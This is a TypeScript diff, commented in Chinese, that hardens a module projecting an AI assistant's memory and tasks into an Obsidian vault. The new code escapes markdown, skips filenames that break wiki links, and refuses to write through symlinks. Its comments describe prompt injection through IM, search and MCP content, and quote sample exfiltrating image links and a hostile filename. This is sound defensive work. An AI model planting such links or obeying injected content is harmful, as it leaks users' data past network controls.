@@ -31,7 +31,20 @@
  * ③ **链只指真实存在的文件**。`[[knowledge/…]]` 只在这个成员的知识库里**真的
  *    有那个文件**时才生成,指不到就原样留着文字——与 M3b 那条「指一条可能不存在
  *    的路,比说『这儿干不了』更坏」同一形状:Obsidian 里一个死链会诱人去新建一个
- *    本不该存在的笔记。
+ *    本不该存在的笔记。**文件名本身也要能被链表达**:名字里带 `[` `]` `|` `#`
+ *    `^` 的文件在 wiki 链语法里根本写不出来,硬拼只会拼出一条指向别处的链,故这
+ *    类文件不进链表(它照样读得到,只是不自动连)。
+ *
+ * ④ **正文里的自由文本一律先中和 markdown**(Codex 轮 C H1)。判断 ③ 管的是
+ *    「我们生成的链」,管不了「别人写进正文的链」——而正文来自模型,模型读的是
+ *    IM 消息 / 搜索结果 / MCP 输出这些**可被注入的**东西。一条被注入的事实只要
+ *    含 `![](https://外面/x?带走的东西)`,成员在 Obsidian 里打开 vault 的那一刻
+ *    浏览器就替它把请求发出去了——那是一条绕过 hub 全部出网边界的外带通道(发
+ *    请求的是成员自己的机器)。`%%…%%` 则相反:它让一条事实在阅读视图里**看不
+ *    见**,而这个投影存在的全部理由就是「让人看见阿同记得什么」。故自由文本进
+ *    正文前一律过 {@link mdSafe}:`[` `]` `<` `>` `` ` `` `\` 恒转义,`%` 只在成
+ *    对时转义。刻意不管 `*` `_` `~~` `$`——那些是观感不是安全,而转义它们会把
+ *    每一份投影都写满反斜杠。
  *
  * # frontmatter 里不放自由文本
  *
@@ -45,7 +58,7 @@
  * 出来不该让成员的一次任务编辑失败(与 STATUS.md 同姿态)。
  */
 
-import { mkdir, readFile, rm, rmdir } from 'node:fs/promises'
+import { lstat, mkdir, readFile, rm, rmdir } from 'node:fs/promises'
 import { join } from 'node:path'
 
 import { writeFileAtomic } from '@gotong/core'
@@ -95,8 +108,17 @@ export interface ObsidianProjector {
    * 重写 `memory/<cluster>.md`。`now` 只用来判某条事实的有效区间还开不开着,
    * 永远不进输出字节(判断 ①)。永不抛。
    */
-  projectMemory(entries: readonly MemoryEntry[], now: number): Promise<void>
-  /** 删掉全部记忆投影(「忘掉全部」要连派生物一起清,否则投影替 jsonl 撒谎)。 */
+  projectMemory(
+    entries: readonly MemoryEntry[],
+    now: number,
+    opts?: { readonly windowed?: boolean },
+  ): Promise<void>
+  /**
+   * 删掉全部记忆投影(「忘掉全部」要连派生物一起清,否则投影替 jsonl 撒谎)。
+   *
+   * **这一件会抛**——与本模块其余「永不抛」相反,理由见实现处:删不掉的那份 md
+   * 和 jsonl 一样读得到,吞掉失败等于把一句「已经忘了」说成谎话。
+   */
   removeMemoryProjections(): Promise<void>
 }
 
@@ -126,6 +148,9 @@ interface KnowledgeLink {
 /** wiki 链前缀:vault 根就是 `<ownerDir>`,知识树在它下面。 */
 const MEMORY_LINK_PREFIX = 'knowledge/'
 
+/** 文件名里出现这些就没法被 `[[…]]` 表达(它们是链语法自己的定界符)。 */
+const LINK_HOSTILE = /[[\]|#^]/
+
 /**
  * 从知识库现有文件建链接表。归档件(`archive/` 前缀)**不进表**——投影里的链
  * 是「现在还在架上的东西」,指向归档件会把人带去一个已经被收起来的版本。
@@ -135,6 +160,11 @@ export function buildKnowledgeLinkTable(files: readonly string[]): KnowledgeLink
   const out: KnowledgeLink[] = []
   for (const p of files) {
     if (typeof p !== 'string' || !p.endsWith('.md') || p.startsWith('archive/')) continue
+    // 知识库的路径校验挡住了控制字符/冒号/反斜杠,但**没挡** `[` `]` `|` `#` `^`
+    // ——而这五个正是 wiki 链语法自己的定界符。`evil]] ![](http://x) [[.md` 是一
+    // 个合法的知识文件名,拼进 `[[…]]` 就成了一条真的图片链。链表达不出来的名字
+    // 就不连(判断 ③ 的直接推论:指不准,就不指)。
+    if (LINK_HOSTILE.test(p)) continue
     if (out.length >= OBSIDIAN_PROJECTION_LIMITS.maxLinkEntries) break
     const link = `[[${MEMORY_LINK_PREFIX}${p.slice(0, -3)}]]`
     out.push({ token: `${MEMORY_LINK_PREFIX}${p}`, link })
@@ -253,7 +283,12 @@ export function renderTasksProjection(
   if (closed.length === 0) {
     lines.push('_(还没有收起来的任务)_', '')
   }
-  const shown = closed.slice(0, OBSIDIAN_PROJECTION_LIMITS.maxClosedTasks)
+  // 笔记本的 `list()` 按 createdAt **升序**给(open 在前)。直接 slice 会留下**最
+  // 老的 30 条**,而下面那句写的是「还有 N 条更早的没有列出」——正好说反。收起来
+  // 的任务里,人要找的是刚做完的那几件,故这里按 updatedAt 倒序取。
+  const shown = [...closed]
+    .sort((a, b) => b.updatedAt - a.updatedAt || (a.id < b.id ? -1 : 1))
+    .slice(0, OBSIDIAN_PROJECTION_LIMITS.maxClosedTasks)
   for (const t of shown) {
     const mark = t.status === 'done' ? '已完成' : '已放弃'
     lines.push(`- ${mark} · \`${t.id}\` ${text(t.title, links, 120)} · ${ymd(t.updatedAt)}`)
@@ -265,8 +300,53 @@ export function renderTasksProjection(
   return `${lines.join('\n').replace(/\n{3,}/g, '\n\n').trimEnd()}\n`
 }
 
+/**
+ * 中和自由文本里的 markdown/Obsidian 语法(判断 ④)。**单扫,不用正则**——与
+ * {@link linkifyKnowledgePaths} 同一纪律。
+ *
+ * 恒转义 `\\` `[` `]` `<` `>` `` ` ``:这五个关掉的是 wiki 链、嵌入(`![[…]]`)、
+ * md 链与图片(`![](…)`)、裸 HTML、以及把后面那截 `\`id\` · 日期` 吞进代码段。
+ * `%` **只在成对时**转义:`%%…%%` 是 Obsidian 的注释语法(阅读视图里整段消失),
+ * 而单个 `%` 在中文正文里很常见(「完成度 80%」),一律转义会把投影写满反斜杠。
+ *
+ * 「成对才转」为什么够:一个 `%` 只有在**下一个输入字符不是 `%`** 时才原样输出,
+ * 所以输出里任何一个未转义 `%` 的后一个字符必然不是 `%` —— 输出里不可能再出现
+ * 未转义的 `%%`。
+ *
+ * 转义用的反斜杠是 CommonMark 的 ASCII 标点转义,渲染出来就是字符本身;代价是
+ * 源码视图里看得见那根反斜杠。投影是机器写的只读派生物,这个代价认。
+ */
+export function mdSafe(raw: string): string {
+  const chars = [...raw]
+  let out = ''
+  for (let i = 0; i < chars.length; i++) {
+    const ch = chars[i] as string
+    if (ch === '%') {
+      // 只转义**成对**的那种(`%%` 是 Obsidian 的注释定界符,会把整段藏起来),
+      // 单个 `%` 原样留着 —— 「完成度 80%」每天都出现,把它写成 `80\%` 是让
+      // 每一份投影都变脏。判据取「左右任一邻居是 %」而不是「下一个是 %」:
+      // 后者对 `%%%` 会漏掉末尾那个,拼出来仍有一对相邻的裸 `%`。
+      // 这条规则一句话可证:裸 `%` 只在两侧邻居都不是 `%` 时才输出 ⇒ 输出里
+      // 不可能出现两个相邻的裸 `%`。
+      const paired = chars[i - 1] === '%' || chars[i + 1] === '%'
+      out += paired ? '\\%' : '%'
+      continue
+    }
+    out += ESCAPE_ALWAYS.has(ch) ? `\\${ch}` : ch
+  }
+  return out
+}
+
+const ESCAPE_ALWAYS: ReadonlySet<string> = new Set(['\\', '[', ']', '<', '>', '`'])
+
+/**
+ * 自由文本进正文的**唯一**通道:折成一行 → 中和语法 → 再连库内链。
+ *
+ * 顺序是承重的:中和必须在 linkify **之前**(否则会把我们自己刚生成的 `[[…]]`
+ * 一起转义掉),也必须在 oneLine **之后**(截断按码点切,不会把一个转义序列劈开)。
+ */
 function text(raw: string, links: readonly KnowledgeLink[], maxChars: number): string {
-  return linkifyKnowledgePaths(oneLine(raw, maxChars), links)
+  return linkifyKnowledgePaths(mdSafe(oneLine(raw, maxChars)), links)
 }
 
 /** 一条事实的出处标签——只从 meta 的结构化位读,不猜。 */
@@ -287,6 +367,7 @@ const GROUP_ORDER = ['画像总结', '阶段摘要', '事实抽取', '记录'] a
 export function renderMemoryTierProjection(
   tier: Pick<TierSpec, 'id' | 'label'>,
   entries: readonly MemoryEntry[],
+  opts: { readonly windowed?: boolean } = {},
 ): string {
   const sorted = [...entries].sort((a, b) => b.ts - a.ts || (a.id < b.id ? -1 : 1))
   const shown = sorted.slice(0, OBSIDIAN_PROJECTION_LIMITS.maxFactsPerTier)
@@ -297,7 +378,7 @@ export function renderMemoryTierProjection(
       ['tier', tier.id],
       ['facts', shown.length],
     ]),
-    `# ${tier.label ?? tier.id}`,
+    `# ${mdSafe(oneLine(tier.label ?? tier.id, 120))}`,
     '',
     '> 只读投影:真相在 `semantic.jsonl`,改这个文件不会改阿同记得什么。这里只列**现在还成立**的事实——被后来的说法替换掉的旧事实不在这儿,但它们仍留在 jsonl 里(记忆不删只翻篇)。',
     '',
@@ -308,13 +389,19 @@ export function renderMemoryTierProjection(
     lines.push(`## ${group}`, '')
     for (const e of rows) {
       lines.push(
-        `- ${oneLine(e.text, OBSIDIAN_PROJECTION_LIMITS.maxFactChars)} · \`${e.id}\` · ${ymd(e.ts)}`,
+        `- ${mdSafe(oneLine(e.text, OBSIDIAN_PROJECTION_LIMITS.maxFactChars))} · \`${e.id}\` · ${ymd(e.ts)}`,
       )
     }
     lines.push('')
   }
   if (sorted.length > shown.length) {
     lines.push(`_(还有 ${sorted.length - shown.length} 条没有列出——完整数据在 \`semantic.jsonl\`)_`, '')
+  }
+  if (opts.windowed) {
+    // 上面那句只数**这个 cluster 内部**被截掉的。窗口是另一回事:调用方一次只
+    // 读得到最新的 N 条事实(文件后端的 list 硬顶),更早的连进都没进来 —— 不说
+    // 这一句,这份文件看起来就是完整的。
+    lines.push('_(这次只读到最新的一批事实,更早的没有参与这次投影)_', '')
   }
   return `${lines.join('\n').trimEnd()}\n`
 }
@@ -337,7 +424,9 @@ export function planMemoryProjections(
   now: number,
   config: TierConfig = DEFAULT_TIERS,
   logger?: ObsidianProjectionLogger,
+  opts: { readonly windowed?: boolean } = {},
 ): MemoryProjectionPlan[] {
+  const seen = new Set<string>()
   const byTier = new Map<string, MemoryEntry[]>()
   for (const e of entries) {
     if (e.kind !== 'semantic') continue
@@ -355,11 +444,29 @@ export function planMemoryProjections(
       })
       continue
     }
+    // id 即文件名 ⇒ 重复的 id 是两个 cluster 写同一个文件,后写的静默盖掉先写的。
+    // 目录配坏了要看得见,不要表现成「那个 cluster 的事实少了一半」。
+    if (seen.has(tier.id)) {
+      logger?.warn('obsidian projection: duplicate cluster id, later one skipped', {
+        tierId: tier.id,
+      })
+      continue
+    }
+    seen.add(tier.id)
     const rows = byTier.get(tier.id) ?? []
+    if (rows.length === 0 && opts.windowed) {
+      // 窗口不完整时「这个 cluster 一条都没有」是**分不出来**的:可能真空了,也
+      // 可能它的事实全落在窗口外。删掉一份仍有真相的投影,比留下一份旧的更坏
+      // ——留着的那份至少是曾经成立过的字节,删掉是让成员的 vault 凭空少一块。
+      continue
+    }
     plans.push({
       tierId: tier.id,
       file: `${MEMORY_PROJECTION_DIR}/${tier.id}.md`,
-      body: rows.length > 0 ? renderMemoryTierProjection(tier, rows) : null,
+      body:
+        rows.length > 0
+          ? renderMemoryTierProjection(tier, rows, { ...(opts.windowed ? { windowed: true } : {}) })
+          : null,
     })
   }
   return plans
@@ -388,6 +495,28 @@ export function isSafeTierId(id: string): boolean {
 
 export function openObsidianProjector(opts: OpenObsidianProjectorOptions): ObsidianProjector {
   const config = opts.tierConfig ?? DEFAULT_TIERS
+
+  /**
+   * `memory/` 必须是真目录,不能是符号链接。
+   *
+   * 投影只写两个地方:vault 根下的 `tasks.md`(原子写 = tmp+rename,rename **替换**
+   * 符号链接而不是穿过它,故文件这一层天生安全)和 `memory/<id>.md`。中间那一层
+   * 目录是唯一能把写和删带出 vault 的缝:`memory` 若是一条指向别处的链接,
+   * `mkdir -p` 会认它、tmp 文件会落在链接的那一头、`rm` 也会删那一头的东西。
+   * 与知识库拒读符号链接同一姿态:不跟着走,响亮跳过。
+   */
+  const memoryDirOk = async (): Promise<boolean> => {
+    try {
+      const st = await lstat(join(opts.dir, MEMORY_PROJECTION_DIR))
+      if (!st.isSymbolicLink()) return true
+    } catch {
+      return true // 还没有这个目录 —— 待会 mkdir 出来的必然是真目录
+    }
+    opts.logger?.warn('obsidian projection: memory/ is a symlink, refusing to write through it', {
+      dir: opts.dir,
+    })
+    return false
+  }
 
   /** 只在字节真的变了才写:没变就不动盘,git 快照/mtime 才不会被投影搅浑。 */
   const writeIfChanged = async (rel: string, body: string): Promise<void> => {
@@ -425,9 +554,13 @@ export function openObsidianProjector(opts: OpenObsidianProjectorOptions): Obsid
       }
     },
 
-    async projectMemory(entries, now) {
+    async projectMemory(entries, now, memOpts) {
       try {
-        for (const plan of planMemoryProjections(entries, now, config, opts.logger)) {
+        if (!(await memoryDirOk())) return
+        const plans = planMemoryProjections(entries, now, config, opts.logger, {
+          ...(memOpts?.windowed ? { windowed: true } : {}),
+        })
+        for (const plan of plans) {
           if (plan.body === null) {
             await rm(join(opts.dir, plan.file), { force: true })
           } else {
@@ -440,18 +573,20 @@ export function openObsidianProjector(opts: OpenObsidianProjectorOptions): Obsid
     },
 
     async removeMemoryProjections() {
-      try {
-        for (const tier of config.tiers) {
-          if (!isSafeTierId(tier.id)) continue
-          await rm(join(opts.dir, MEMORY_PROJECTION_DIR, `${tier.id}.md`), { force: true })
-        }
-        // 目录可能还装着别的东西(人自己放的笔记),非空就留着。
-        await rmdir(join(opts.dir, MEMORY_PROJECTION_DIR)).catch(() => undefined)
-      } catch (err) {
-        opts.logger?.warn('obsidian projection: memory projection cleanup failed', {
-          err: errMsg(err),
-        })
+      // **不吞异常**(Codex 轮 C H3)。本模块其余路径失败只 warn,因为投影是派生
+      // 物、下一 tick 会自愈;这一条不一样:调用它的是「忘掉关于我的全部」,而删
+      // 不掉的那份 md 与 jsonl 一样读得到。吞掉失败 = 成员收到一句「已经忘了」,
+      // 而事实还在他的 vault 里摆着。抛出去让 /me 如实报错;重试是幂等的。
+      if (!(await memoryDirOk())) {
+        throw new Error(`memory/ 是一条符号链接,拒绝经它删除:${join(opts.dir, MEMORY_PROJECTION_DIR)}`)
       }
+      for (const tier of config.tiers) {
+        if (!isSafeTierId(tier.id)) continue
+        await rm(join(opts.dir, MEMORY_PROJECTION_DIR, `${tier.id}.md`), { force: true })
+      }
+      // 目录可能还装着别的东西(人自己放的笔记),非空就留着 —— 这一条的失败是
+      // **预期内**的(ENOTEMPTY),不该把一次成功的遗忘变成错误。
+      await rmdir(join(opts.dir, MEMORY_PROJECTION_DIR)).catch(() => undefined)
     },
   }
 }
